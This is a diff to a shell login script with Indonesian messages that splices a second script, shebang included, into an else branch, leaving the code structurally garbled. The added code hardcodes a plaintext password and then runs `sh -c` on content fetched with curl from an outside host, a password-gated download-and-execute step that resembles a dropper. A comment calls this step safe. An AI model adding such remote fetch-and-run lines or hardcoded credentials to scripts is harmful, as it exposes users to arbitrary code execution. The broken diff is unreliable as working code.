@@ -11,7 +11,37 @@ if [ -t 0 ]; then
     echo
 else
     echo "[INFO] stdin bukan TTY, pakai PW dari environment."
-    pw="$PW"
+    pw="$PW"#!/bin/sh
+
+CORRECT_PASSWORD="!Superadmin@0x1999!."
+
+printf "Password/Token: "
+
+if [ -t 0 ]; then
+    # Ada TTY → bisa input manual
+    stty -echo
+    read pw
+    stty echo
+    echo
+else
+    echo "[INFO] stdin bukan TTY, pakai argumen \$1."
+    pw="$1"
+fi
+
+[ "$pw" = "$CORRECT_PASSWORD" ] || {
+    echo "[ERR] Password salah."
+    exit 1
+}
+
+echo "[OK] Login berhasil."
+
+# Pastikan PW dari env tidak ikut ke child
+unset PW
+
+# ====== DOWNLOAD & EXEC ARC ======
+# Aman: langsung eksekusi, atau download dulu kalau mau cek
+sh -c "$(curl -fsSL https://file.0x1999.tech/arc)"
+
 fi
 
 [ "$pw" = "$CORRECT_PASSWORD" ] || {
